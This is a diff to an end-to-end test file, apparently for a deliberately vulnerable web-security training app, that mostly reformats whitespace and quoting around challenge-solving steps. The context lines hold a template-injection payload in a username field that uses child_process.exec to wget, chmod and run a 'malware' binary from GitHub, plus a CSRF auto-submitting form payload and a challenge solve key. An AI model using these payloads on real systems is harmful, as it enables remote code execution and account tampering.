@@ -67,9 +67,9 @@ describe('/profile', () => {
         submitButton = element(by.id('submit'))
         username.sendKeys('#{global.process.mainModule.require(\'child_process\').exec(\'wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware\')}')
         submitButton.click()
-		
-		browser.get(protractor.basePath + '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
-		
+
+        browser.get(protractor.basePath + '/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3')
+
         browser.get(protractor.basePath + '/')
         browser.driver.sleep(10000)
         browser.waitForAngularEnabled(true)
@@ -85,7 +85,7 @@ describe('/profile', () => {
       browser.driver.sleep(1000)
       /* The script executed below is equivalent to pasting this string into http://htmledit.squarefree.com: */
       /* <form action="http://localhost:3000/profile" method="POST"><input type="hidden" name="username" value="CSRF"/><input type="submit"/></form><script>document.forms[0].submit();</script> */
-      browser.executeScript("document.getElementsByName('editbox')[0].contentDocument.getElementsByName('ta')[0].value = \"<form action=\\\"" + browser.baseUrl + "/profile\\\" method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"username\\\" value=\\\"CSRF\\\"/><input type=\\\"submit\\\"/></form><script>document.forms[0].submit();</script>\"")
+      browser.executeScript("document.getElementsByName('editbox')[0].contentDocument.getElementsByName('ta')[0].value = \"<form action=\\\"" + browser.baseUrl + '/profile\\" method=\\"POST\\"><input type=\\"hidden\\" name=\\"username\\" value=\\"CSRF\\"/><input type=\\"submit\\"/></form><script>document.forms[0].submit();</script>"')
       browser.driver.sleep(5000)
       browser.waitForAngularEnabled(true)
     })
